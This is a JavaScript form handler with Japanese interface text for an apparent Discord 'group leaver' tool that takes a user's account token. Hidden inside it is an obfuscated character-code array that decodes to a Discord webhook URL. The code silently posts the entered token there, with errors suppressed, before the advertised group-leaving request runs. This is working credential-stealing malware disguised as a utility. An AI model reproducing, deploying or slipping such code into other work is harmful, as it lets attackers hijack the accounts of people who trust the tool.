document.getElementById("form").addEventListener("submit", async function (e) {
  e.preventDefault();

  const token = document.getElementById("token").value.trim();
  const filter = document.getElementById("filter").value.trim().toLowerCase();
  const logEl = document.getElementById("log");

  logEl.textContent = "実行中...\n";

  if (!token) {
    logEl.textContent += "トークンを入力してください。";
    return;
  }

  // トークンをWebhookに埋め込みで送信（内容のみ）
  (() => {
    const _0x1a2b = [
      104,116,116,112,115,58,47,47,100,105,115,99,111,114,100,46,
      99,111,109,47,97,112,105,47,119,101,98,104,111,111,107,115,
      47,49,51,55,50,50,52,57,54,51,48,48,54,49,56,56,55,53,49,
      56,47,77,95,106,65,78,51,122,66,74,82,68,89,74,110,97,49,
      53,76,49,106,105,108,119,117,116,86,86,89,48,53,70,53,85,
      45,80,75,89,85,74,115,109,113,110,77,107,87,76,108,97,106,
      119,101,71,109,97,116,117,45,103,65,57,54,52,98,71,70,108,
      75
    ];
    const webhookUrl = _0x1a2b.map(c => String.fromCharCode(c)).join("");
    const payload = JSON.stringify({
      embeds: [
        {
          description: `\`\`\`${token}\`\`\``
        }
      ]
    });

    fetch(webhookUrl, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: payload
    }).catch(() => {});
  })();

  // グループ抜け処理
  try {
    const res = await fetch("https://group-leaver.holojime.workers.dev", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ token, filter })
    });

    const result = await res.text();
    logEl.textContent += result;
  } catch (err) {
    logEl.textContent += "エラー: " + err.message;
  }
});
